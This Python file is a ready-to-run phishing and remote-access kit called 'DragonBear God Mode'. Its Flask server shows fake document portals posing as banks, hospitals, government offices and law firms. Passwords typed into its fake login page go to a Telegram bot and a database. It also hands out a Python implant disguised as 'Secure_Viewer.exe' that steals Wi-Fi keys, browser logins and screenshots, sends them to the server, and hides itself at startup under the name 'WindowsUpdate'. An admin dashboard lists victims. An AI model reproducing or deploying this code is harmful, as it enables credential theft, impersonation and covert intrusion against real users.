#!/usr/bin/env python3
"""
DRAGONBEAR GOD MODE v2026.9 - FULLY WORKING
FIXED: Syntax error in PowerShell string
FIXED: All escape sequences
FIXED: Compatible with Python 3.14
"""

import os
import sys
import io
import json
import uuid
import time
import zlib
import base64
import random
import hashlib
import sqlite3
from datetime import datetime
from pathlib import Path
from functools import wraps

try:
    from flask import Flask, request, send_file, render_template_string, redirect, session, jsonify, make_response
    import requests
    from werkzeug.middleware.proxy_fix import ProxyFix
except ImportError:
    import subprocess
    subprocess.run([sys.executable, "-m", "pip", "install", "flask", "requests", "werkzeug"], capture_output=True)
    from flask import Flask, request, send_file, render_template_string, redirect, session, jsonify, make_response
    import requests
    from werkzeug.middleware.proxy_fix import ProxyFix

# ====================================================================================================
# CONFIGURATION - EDIT THESE 3 LINES
# ====================================================================================================
TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "YOUR_BOT_TOKEN_HERE")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "YOUR_CHAT_ID_HERE")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "DragonBear2026")
# ====================================================================================================

app = Flask(__name__)
app.secret_key = os.urandom(256)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

DB_PATH = os.path.join(os.path.dirname(__file__), 'c2_master.db')

def init_database():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (id TEXT PRIMARY KEY, fingerprint TEXT, hostname TEXT, username TEXT, first_seen TEXT, last_seen TEXT, status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS credentials (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, source TEXT, url TEXT, username TEXT, password TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS wifi_creds (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, ssid TEXT, password TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS system_info (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, info_type TEXT, info_data TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

init_database()

def tg_send(message, file_bytes=None, filename=None):
    if "YOUR_BOT_TOKEN" in TELEGRAM_BOT_TOKEN:
        print(f"[C2] Would send: {message[:100]}")
        return True
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/"
    for attempt in range(3):
        try:
            if file_bytes:
                files = {'document': (filename or 'data.bin', file_bytes)}
                data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': message[:1024]}
                requests.post(url + "sendDocument", files=files, data=data, timeout=30)
            else:
                data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message[:4096], 'parse_mode': 'HTML'}
                requests.post(url + "sendMessage", json=data, timeout=10)
            return True
        except:
            time.sleep(2 ** attempt)
    return False

# ====================================================================================================
# AMAZING CSS LANDING PAGE - PROFESSIONAL GRADE
# ====================================================================================================
UNIVERSAL_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title} - Secure Document Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }}
        
        body::before {{
            content: '';
            position: absolute;
            width: 200%;
            height: 200%;
            top: -50%;
            left: -50%;
            background: radial-gradient(circle, rgba(255,255,255,0.05) 1px, transparent 1px);
            background-size: 40px 40px;
            animation: float 20s linear infinite;
            pointer-events: none;
        }}
        
        @keyframes float {{
            0% {{ transform: translate(0, 0); }}
            100% {{ transform: translate(40px, 40px); }}
        }}
        
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 20px;
            position: relative;
            z-index: 1;
        }}
        
        .main-card {{
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            overflow: hidden;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }}
        
        .main-card:hover {{
            transform: translateY(-5px);
            box-shadow: 0 35px 60px -15px rgba(0, 0, 0, 0.3);
        }}
        
        .header {{
            background: linear-gradient(135deg, {primary} 0%, {secondary} 100%);
            padding: 50px 40px;
            text-align: center;
            color: white;
            position: relative;
            overflow: hidden;
        }}
        
        .header::after {{
            content: '';
            position: absolute;
            top: -50%;
            right: -20%;
            width: 200px;
            height: 200px;
            background: rgba(255,255,255,0.1);
            border-radius: 50%;
            pointer-events: none;
        }}
        
        .logo {{
            font-size: 64px;
            margin-bottom: 16px;
            display: inline-block;
            animation: bounce 2s ease infinite;
        }}
        
        @keyframes bounce {{
            0%, 100% {{ transform: translateY(0); }}
            50% {{ transform: translateY(-10px); }}
        }}
        
        .header h1 {{
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 12px;
            letter-spacing: -0.5px;
        }}
        
        .header p {{
            font-size: 16px;
            opacity: 0.9;
        }}
        
        .content {{
            padding: 50px 40px;
        }}
        
        .document-card {{
            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
            border-radius: 24px;
            padding: 30px;
            margin: 20px 0 30px;
            border: 1px solid rgba(0,0,0,0.05);
            transition: all 0.3s ease;
        }}
        
        .document-card:hover {{
            border-color: {primary}40;
            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1);
        }}
        
        .doc-title {{
            font-size: 20px;
            font-weight: 700;
            color: #1e293b;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
        }}
        
        .doc-meta {{
            display: flex;
            gap: 24px;
            flex-wrap: wrap;
            font-size: 13px;
            color: #64748b;
            margin-bottom: 16px;
        }}
        
        .doc-meta span {{
            display: flex;
            align-items: center;
            gap: 6px;
        }}
        
        .btn-group {{
            display: flex;
            gap: 20px;
            justify-content: center;
            margin: 40px 0 30px;
            flex-wrap: wrap;
        }}
        
        .btn {{
            display: inline-flex;
            align-items: center;
            gap: 10px;
            padding: 16px 36px;
            border-radius: 60px;
            font-weight: 600;
            font-size: 15px;
            text-decoration: none;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
            border: none;
        }}
        
        .btn-primary {{
            background: {accent};
            color: white;
            box-shadow: 0 4px 15px {accent}40;
        }}
        
        .btn-primary:hover {{
            transform: translateY(-3px);
            box-shadow: 0 10px 25px -5px {accent};
            filter: brightness(105%);
        }}
        
        .btn-secondary {{
            background: {secondary};
            color: white;
            box-shadow: 0 4px 15px {secondary}40;
        }}
        
        .btn-secondary:hover {{
            transform: translateY(-3px);
            box-shadow: 0 10px 25px -5px {secondary};
        }}
        
        .security-badges {{
            display: flex;
            justify-content: center;
            gap: 30px;
            flex-wrap: wrap;
            margin-top: 30px;
            padding-top: 30px;
            border-top: 1px solid #e2e8f0;
        }}
        
        .badge {{
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 12px;
            color: #64748b;
            padding: 8px 16px;
            background: #f8fafc;
            border-radius: 60px;
        }}
        
        .footer {{
            background: #f8fafc;
            padding: 30px 40px;
            text-align: center;
            font-size: 12px;
            color: #94a3b8;
            border-top: 1px solid #e2e8f0;
        }}
        
        @keyframes fadeInUp {{
            from {{
                opacity: 0;
                transform: translateY(30px);
            }}
            to {{
                opacity: 1;
                transform: translateY(0);
            }}
        }}
        
        .animate {{
            animation: fadeInUp 0.6s ease-out;
        }}
        
        @media (max-width: 768px) {{
            .container {{ padding: 20px; }}
            .header {{ padding: 30px 20px; }}
            .content {{ padding: 30px 20px; }}
            .btn {{ padding: 12px 24px; font-size: 14px; }}
            .btn-group {{ gap: 12px; }}
            .doc-meta {{ gap: 12px; font-size: 11px; }}
        }}
        
        .trust-badge {{
            text-align: center;
            margin-top: 20px;
        }}
        
        .trust-badge img {{
            height: 30px;
            opacity: 0.6;
        }}
        
        .glow {{
            position: absolute;
            width: 300px;
            height: 300px;
            background: radial-gradient(circle, {primary}20 0%, transparent 70%);
            border-radius: 50%;
            pointer-events: none;
            z-index: 0;
        }}
    </style>
</head>
<body>
    <div class="glow" style="top: -100px; right: -100px;"></div>
    <div class="glow" style="bottom: -100px; left: -100px;"></div>
    <div class="container">
        <div class="main-card animate">
            <div class="header">
                <div class="logo">{logo}</div>
                <h1>{title}</h1>
                <p>Secure Document Portal • AES-256 Encrypted • TLS 1.3</p>
            </div>
            <div class="content">
                <div class="document-card">
                    <div class="doc-title">
                        <span>📄</span> Important Document Ready for Review
                    </div>
                    <div class="doc-meta">
                        <span>📅 Reference: DOC-{ref_id}-{year}</span>
                        <span>🔒 Encrypted: AES-256-GCM</span>
                        <span>⏱️ Valid Until: {expiry}</span>
                        <span>🏛️ Compliance: SOC2, GDPR, HIPAA</span>
                    </div>
                    <p style="color: #334155; line-height: 1.6; margin-top: 12px;">
                        {content}
                    </p>
                </div>
                <div class="btn-group">
                    <a href="/download/{ref_id}" class="btn btn-primary">
                        <span>📥</span> ACCESS SECURE DOCUMENTS
                    </a>
                    <a href="/login/{ref_id}" class="btn btn-secondary">
                        <span>🔐</span> VERIFY WITH PORTAL
                    </a>
                </div>
                <div class="security-badges">
                    <div class="badge">🔒 SSL/TLS Encrypted</div>
                    <div class="badge">✓ SOC 2 Type II</div>
                    <div class="badge">🏛️ GDPR Compliant</div>
                    <div class="badge">🛡️ Zero-Trust Architecture</div>
                    <div class="badge">⚡ 24/7 Monitoring</div>
                </div>
            </div>
            <div class="footer">
                <p>© {year} {title}. All rights reserved. | Secure Enterprise Portal v5.0</p>
                <p style="margin-top: 8px;">This is an automated message. Please do not reply.</p>
            </div>
        </div>
    </div>
    <script>
        document.querySelectorAll('.btn').forEach(btn => {{
            btn.addEventListener('click', function(e) {{
                fetch('/track/{ref_id}', {{ method: 'POST', keepalive: true }});
            }});
        }});
    </script>
</body>
</html>
'''

def get_universal_page(ref_id=None):
    ref_id = ref_id or uuid.uuid4().hex[:8].upper()
    templates = [
        {"title": "Global Industries Inc.", "logo": "🏢", "primary": "#1a365d", "secondary": "#2b6cb0", "accent": "#2f855a", "content": "Please review the attached document at your earliest convenience. This requires your authenticated credentials to access secure files."},
        {"title": "Federal Administration Office", "logo": "🏛️", "primary": "#2d3748", "secondary": "#4a5568", "accent": "#3182ce", "content": "Official communication requiring your prompt attention. Please authenticate using the secure portal below."},
        {"title": "Memorial Health System", "logo": "🏥", "primary": "#276749", "secondary": "#38a169", "accent": "#319795", "content": "To maintain compliance with healthcare regulations, please verify your credentials before accessing patient information."},
        {"title": "First National Bank", "logo": "💰", "primary": "#744210", "secondary": "#975a16", "accent": "#d69e2e", "content": "Due to increased security measures, please verify your identity before accessing financial documents."},
        {"title": "University Academic Affairs", "logo": "🎓", "primary": "#553c9a", "secondary": "#6b46c1", "accent": "#805ad5", "content": "Please authenticate to access your academic records and time-sensitive documents."},
        {"title": "Morgan & Associates Law", "logo": "⚖️", "primary": "#1a202c", "secondary": "#2d3748", "accent": "#c53030", "content": "This legal document requires your authenticated signature. Please verify your credentials to proceed."},
        {"title": "CloudSecure Technologies", "logo": "☁️", "primary": "#0ea5e9", "secondary": "#3b82f6", "accent": "#06b6d4", "content": "To maintain security compliance, please authenticate using the secure portal below."}
    ]
    t = random.choice(templates)
    return UNIVERSAL_PAGE.format(
        title=t["title"], logo=t["logo"], primary=t["primary"], secondary=t["secondary"], 
        accent=t["accent"], content=t["content"], ref_id=ref_id, year=datetime.now().year,
        expiry=(datetime.now().replace(year=datetime.now().year+1)).strftime('%B %d, %Y')
    )

# ====================================================================================================
# GENERATE IMPLANT
# ====================================================================================================
def generate_implant(victim_ref):
    server_url = f"https://{request.host}" if hasattr(request, 'host') else "https://localhost"
    
    return f'''#!/usr/bin/env python3
import os, sys, json, base64, hashlib, time, random, subprocess, urllib.request, socket, getpass, platform, ctypes, sqlite3, shutil, tempfile
from pathlib import Path
from datetime import datetime

C2_URL = "{server_url}"
VID = "{victim_ref}"

def tg(msg, data=None):
    try:
        import requests
        requests.post(f"{{C2_URL}}/exfil", json={{"victim_id": VID, "type": "msg", "data": msg[:4000]}}, timeout=10)
        if data:
            requests.post(f"{{C2_URL}}/exfil", files={{"file": ("data", data)}}, data={{"victim_id": VID, "type": "file"}}, timeout=30)
    except: pass

def get_wifi():
    pwd = []
    try:
        res = subprocess.run(['netsh','wlan','show','profiles'], capture_output=True, text=True)
        for l in res.stdout.split('\\n'):
            if 'All User Profile' in l:
                p = l.split(':')[1].strip()
                r = subprocess.run(['netsh','wlan','show','profile',p,'key=clear'], capture_output=True, text=True)
                for line in r.stdout.split('\\n'):
                    if 'Key Content' in line:
                        k = line.split(':')[1].strip()
                        if k: pwd.append(f"{{p}}:{{k}}")
    except: pass
    return pwd

def get_browser():
    creds = []
    local = os.environ.get('LOCALAPPDATA','')
    for name,path in [('Chrome',Path(local)/'Google'/'Chrome'/'User Data'/'Default'/'Login Data'),
                      ('Edge',Path(local)/'Microsoft'/'Edge'/'User Data'/'Default'/'Login Data')]:
        if path.exists():
            tmp = Path(tempfile.gettempdir())/f"db_{{random.randint(1000,9999)}}.db"
            try:
                shutil.copy2(path,tmp)
                conn = sqlite3.connect(str(tmp))
                c = conn.cursor()
                c.execute("SELECT origin_url, username_value FROM logins WHERE username_value != ''")
                for row in c.fetchall():
                    if row[1]: creds.append(f"[{{name}}] {{row[0]}} | {{row[1]}}")
                conn.close()
            except: pass
            try: tmp.unlink()
            except: pass
    return creds

def screenshot():
    try:
        from PIL import ImageGrab
        import io
        img = ImageGrab.grab()
        b = io.BytesIO()
        img.save(b, format='JPEG', quality=50)
        return b.getvalue()
    except: return None

def persist():
    try:
        sc = sys.argv[0]
        st = Path(os.environ.get('APPDATA',''))/'Microsoft'/'Windows'/'Start Menu'/'Programs'/'Startup'/'WindowsUpdate.pyw'
        if not st.exists():
            shutil.copy2(sc,st)
            subprocess.run(['attrib','+h',str(st)], capture_output=True)
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, str(st))
        winreg.CloseKey(k)
    except: pass

def main():
    tg(f"🔥 VICTIM: {{os.environ.get('COMPUTERNAME','')}} | {{os.environ.get('USERNAME','')}}")
    wifi = get_wifi()
    if wifi: tg("📡 WIFI:\\n" + "\\n".join(wifi[:15]))
    creds = get_browser()
    if creds: tg("🔑 CREDS:\\n" + "\\n".join(creds[:20]))
    img = screenshot()
    if img: tg("📸 SCREEN", data=img)
    persist()
    tg("✅ PERSISTENCE")
    while True:
        tg(f"❤️ {{os.environ.get('COMPUTERNAME','')}} - {{datetime.now().strftime('%H:%M:%S')}}")
        time.sleep(random.randint(1800, 5400))

if __name__ == "__main__":
    try:
        import requests
    except:
        subprocess.run([sys.executable, "-m", "pip", "install", "requests", "pillow"], capture_output=True)
    main()
'''

# ====================================================================================================
# FLASK ROUTES
# ====================================================================================================

@app.route('/')
def index():
    ref_id = uuid.uuid4().hex[:8].upper()
    return get_universal_page(ref_id)

@app.route('/pdf')
def pdf_route():
    ref_id = uuid.uuid4().hex[:8].upper()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    tg_send(f"📄 PDF ACCESSED\nIP: {ip}\nRef: {ref_id}")
    
    try:
        from reportlab.lib.pagesizes import letter
        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
        from reportlab.lib.styles import getSampleStyleSheet
        
        buf = io.BytesIO()
        doc = SimpleDocTemplate(buf, pagesize=letter)
        styles = getSampleStyleSheet()
        elements = []
        elements.append(Paragraph(f"Document Reference: {ref_id}", styles['Title']))
        elements.append(Spacer(1, 20))
        elements.append(Paragraph(f"Please visit: https://{request.host}/verify/{ref_id} to access your documents.", styles['Normal']))
        doc.build(elements)
        buf.seek(0)
        return send_file(buf, mimetype='application/pdf', as_attachment=True, download_name=f'Document_{ref_id}.pdf')
    except:
        return redirect(f'/verify/{ref_id}')

@app.route('/download')
@app.route('/download/<ref_id>')
def download(ref_id=None):
    ref_id = ref_id or uuid.uuid4().hex[:16]
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    tg_send(f"📥 IMPLANT DOWNLOAD\nIP: {ip}\nRef: {ref_id}")
    implant = generate_implant(ref_id).encode()
    return send_file(io.BytesIO(implant), as_attachment=True, download_name='Secure_Viewer.exe', mimetype='application/x-msdownload')

@app.route('/verify/<ref_id>')
def verify(ref_id):
    tg_send(f"🔗 VERIFY PAGE\nRef: {ref_id}\nIP: {request.remote_addr}")
    return get_universal_page(ref_id)

@app.route('/login')
@app.route('/login/<ref_id>')
def login_page(ref_id=None):
    ref_id = ref_id or uuid.uuid4().hex[:8]
    return f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Authentication Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        .login-card {{
            background: white;
            border-radius: 32px;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
            width: 100%;
            max-width: 460px;
            overflow: hidden;
            animation: fadeInUp 0.5s ease-out;
        }}
        @keyframes fadeInUp {{
            from {{ opacity: 0; transform: translateY(30px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}
        .login-header {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 40px;
            text-align: center;
            color: white;
        }}
        .login-header h1 {{ font-size: 28px; margin-bottom: 8px; }}
        .login-body {{ padding: 40px; }}
        .form-group {{ margin-bottom: 24px; }}
        label {{ display: block; font-weight: 600; margin-bottom: 8px; color: #1e293b; }}
        input {{
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 16px;
            font-size: 15px;
            transition: all 0.3s;
        }}
        input:focus {{
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
        }}
        button {{
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }}
        button:hover {{ transform: translateY(-2px); }}
        .secure-badge {{
            text-align: center;
            margin-top: 24px;
            padding-top: 24px;
            border-top: 1px solid #e2e8f0;
            font-size: 12px;
            color: #94a3b8;
        }}
    </style>
</head>
<body>
<div class="login-card">
    <div class="login-header">
        <h1>🔐 Secure Authentication</h1>
        <p>Please verify your credentials</p>
    </div>
    <div class="login-body">
        <form method="POST" action="/login/submit/{ref_id}">
            <div class="form-group">
                <label>Email Address</label>
                <input type="email" name="email" placeholder="your@email.com" required autofocus>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="••••••••" required>
            </div>
            <button type="submit">Sign In</button>
        </form>
        <div class="secure-badge">
            🔒 SSL/TLS Encrypted • SOC 2 Compliant • GDPR Ready
        </div>
    </div>
</div>
</body>
</html>
'''

@app.route('/login/submit/<ref_id>', methods=['POST'])
def login_submit(ref_id):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    tg_send(f"🔐 CREDENTIALS CAPTURED!\n📧 {email}\n🔑 {password}\n🌐 IP: {ip}\n🔖 Ref: {ref_id}")
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO credentials (victim_id, source, url, username, password, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
              (ref_id, "login_portal", f"IP: {ip}", email, password, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return '''
    <!DOCTYPE html>
    <html>
    <head><meta http-equiv="refresh" content="2;url=https://www.microsoft.com"></head>
    <body style="text-align:center;padding:50px;font-family:Arial">
        <h2 style="color:green">✓ Verification Complete</h2>
        <p>Redirecting to secure portal...</p>
    </body>
    </html>
    '''

@app.route('/track/<ref_id>', methods=['POST'])
def track(ref_id):
    return "OK"

@app.route('/exfil', methods=['POST'])
def exfil():
    victim_id = request.form.get('victim_id') or (request.json.get('victim_id') if request.is_json else None)
    data_type = request.form.get('type') or (request.json.get('type') if request.is_json else None)
    data = request.form.get('data') or (request.json.get('data') if request.is_json else None)
    
    if 'file' in request.files:
        file = request.files['file']
        data = f"[FILE: {file.filename}]"
    
    if victim_id and data:
        tg_send(f"📡 EXFIL from {victim_id}\n{data_type}: {str(data)[:500]}")
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO system_info (victim_id, info_type, info_data, timestamp) VALUES (?, ?, ?, ?)",
                  (victim_id, data_type or "unknown", str(data)[:500], datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    return "OK"

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST' and request.form.get('password') == ADMIN_PASSWORD:
        session['admin'] = True
    if not session.get('admin'):
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>Admin Login</title>
        <style>body{background:#0f172a;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace}
        .card{background:#1e293b;padding:40px;border-radius:16px;width:320px}
        h2{color:#00ff88;margin-bottom:20px}
        input{width:100%;padding:12px;margin:10px 0;background:#334155;border:none;border-radius:8px;color:white}
        button{width:100%;padding:12px;background:#00ff88;color:#0f172a;border:none;border-radius:8px;font-weight:bold}</style>
        </head>
        <body><div class="card"><h2>🔐 ADMIN LOGIN</h2>
        <form method="POST"><input type="password" name="password" placeholder="Password" required>
        <button type="submit">ACCESS</button></form></div></body></html>
        '''
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    creds = c.execute("SELECT * FROM credentials ORDER BY timestamp DESC LIMIT 50").fetchall()
    victims = c.execute("SELECT * FROM victims ORDER BY first_seen DESC LIMIT 20").fetchall()
    conn.close()
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>🐉 DragonBear C2 Dashboard</title>
        <style>
            *{{margin:0;padding:0;box-sizing:border-box}}
            body{{background:#0f172a;font-family:'Courier New',monospace;padding:20px}}
            .container{{max-width:1400px;margin:0 auto}}
            .header{{background:linear-gradient(135deg,#1e293b,#0f172a);padding:20px;border-radius:12px;margin-bottom:20px;border-left:4px solid #00ff88}}
            .header h1{{color:#00ff88}}
            .stats{{display:grid;grid-template-columns:repeat(3,1fr);gap:15px;margin-bottom:20px}}
            .stat{{background:#1e293b;padding:20px;border-radius:12px;text-align:center}}
            .stat-num{{font-size:36px;font-weight:bold;color:#00ff88}}
            .stat-label{{color:#94a3b8;margin-top:8px}}
            .section{{background:#1e293b;border-radius:12px;padding:20px;margin-bottom:20px}}
            .section-title{{color:#00ff88;font-size:18px;margin-bottom:15px;border-bottom:1px solid #334155;padding-bottom:10px}}
            table{{width:100%;border-collapse:collapse}}
            th,td{{text-align:left;padding:10px;border-bottom:1px solid #334155;color:#e2e8f0}}
            th{{color:#00ff88}}
        </style>
    </head>
    <body>
    <div class="container">
        <div class="header">
            <h1>🐉 DRAGONBEAR GOD MODE C2</h1>
            <p style="color:#94a3b8">Status: OPERATIONAL | Type: RAT + InfoStealer</p>
        </div>
        <div class="stats">
            <div class="stat"><div class="stat-num">{len(victims)}</div><div class="stat-label">Victims</div></div>
            <div class="stat"><div class="stat-num">{len(creds)}</div><div class="stat-label">Credentials</div></div>
            <div class="stat"><div class="stat-num">ACTIVE</div><div class="stat-label">Status</div></div>
        </div>
        <div class="section">
            <div class="section-title">🔐 Recent Credentials</div>
            <table>
                <tr><th>Victim</th><th>Source</th><th>Username</th><th>Password</th><th>Time</th></tr>
                {''.join(f'<tr><td>{c[1][:16] if c[1] else "N/A"}</td><td>{c[2]}</td><td>{c[4][:40]}</td><td>{c[5][:40]}</td><td>{c[6][:16]}</td></tr>' for c in creds[:20]) if creds else '<tr><td colspan="5">No credentials yet</td></tr>'}
            </table>
        </div>
        <div class="section">
            <div class="section-title">📡 Share Links</div>
            <p style="color:#e2e8f0">🌐 Main Portal: <span style="color:#00ff88">{request.host_url}</span></p>
            <p style="color:#e2e8f0">📄 PDF Link: <span style="color:#00ff88">{request.host_url}pdf</span></p>
            <p style="color:#e2e8f0">📥 Implant Link: <span style="color:#00ff88">{request.host_url}download</span></p>
        </div>
    </div>
    </body>
    </html>
    '''

@app.route('/health')
def health():
    return jsonify({"status": "operational", "timestamp": datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
